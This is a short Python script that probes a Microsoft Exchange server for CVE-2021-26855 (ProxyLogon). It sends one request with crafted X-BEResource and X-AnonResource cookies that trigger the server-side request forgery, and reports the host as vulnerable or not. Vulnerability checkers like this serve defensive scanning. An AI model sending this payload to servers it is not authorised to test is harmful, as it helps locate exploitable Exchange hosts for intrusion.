#!/usr/bin/env python
# -*- coding: utf-8 -*-

""" This script test the CVE-2021-26855 vulnerability. """

###################
#    This script test the CVE-2021-26855 vulnerability.
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

print(
    """
ExchangeWeaknessTest  Copyright (C) 2021  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
)

from http.client import HTTPSConnection
from sys import argv

if len(argv) != 2:
	print("USAGE: python3 ExchangeWeaknessTest.py <domain or ip>")
	exit(1)

_, domain = argv

request = HTTPSConnection(domain)
request.request("GET", "/owa/auth/x.js", headers={"Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;"})

response = request.getresponse()

target = response.getheader("x-calculatedbetarget")

if response and response.status == 500 and 'localhost' in target:
	print(f"Target: {domain} is vulnerable !")
else:
	print(f"Target: {domain} is probably not vulnerable.")